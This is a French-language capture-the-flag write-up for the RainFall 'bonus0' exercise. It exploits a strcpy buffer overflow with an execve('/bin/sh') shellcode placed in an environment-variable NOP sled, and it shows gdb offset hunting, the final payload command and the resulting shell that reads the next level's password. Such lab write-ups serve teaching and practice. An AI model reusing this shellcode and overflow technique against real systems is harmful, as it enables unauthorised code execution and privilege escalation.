# Bonus 0

En ouvrant le programme dans cuter on ce rend compte qu'il y a 2 fonction `p` et `pp` le programe attend 2 chaine de caractere en parametre qu'il concate, on remarque egalement qu'il ya un `strcpy` qu'on pout tenter d'overflow.
Le programe ne contient pas de `cat .pass` ou de `/bin/sh` il va donc faloir utiliser un shellcode vu precedament 
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
La premiere chose a faire est donc de chercher un `segfault` pour ce faire nous allons utiliser un buffer overflow generator comme dans l'exercice 2 https://wiremask.eu/tools/buffer-overflow-pattern-generator/ 
```
(gdb) run 
Starting program: /home/user/bonus0/bonus0 
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
(gdb) 
```
En entrant `0x41336141` dans le générateur on trouve un offset de 9 octet, en testant on ce rend compte que c'est la 2nd chaine qui `segfault`. Etant donner que le buffer est trop petit pour y mettre le payload il va faloir creer une variable d'environement que nous allons remeplire ed `\90` qui est  l'opperateur logique de NOP 
```
bonus0@RainFall:~$ export payload=$(python -c 'print "\x90"*500+"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```
et on vas aller chercher dans le programe une addresse du nopslid de notre variable d'environement, qui vas executer des NOP jusqu'a ce qu'il arrive a notre shellcode
```
bonus0@RainFall:~$ gdb ./bonus0 
gdb) b main 
Breakpoint 1 at 0x80485a7
(gdb) run 
Starting program: /home/user/bonus0/bonus0 

Breakpoint 1, 0x080485a7 in main ()
(gdb) x/200s environ 
[...]
0xbffffc92:      "payload=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xbffffd5a:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\
---Type <return> to continue, or q <return> to quit---
20\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xbffffe22:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
0xbffffea4:      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
[...]
```
On trouve que le read utiliser un peu plus tard, a une size de 4096 (0x1000), et on ajoute des caracteres en plus pour atteindre la limite du buffer. Il faut ajouter un \n pour separer nos deux entrees, on le met alors a limite du buffer utiliser par le read (a * 4095) + '\n' + (a* 9) + L'adresse du nopesled
```
bonus0@RainFall:~$ python -c 'print "a" * 4095+"\n"+ "a"*9+"\x5a\xfd\xff\xbf" + "a"*30' > /tmp/payload1 
bonus0@RainFall:~$ cat /tmp/payload1 - | ./bonus0 
 - 
 - 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ���aaaaaaa��� aaaaaaaaaZ���aaaaaaa���
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
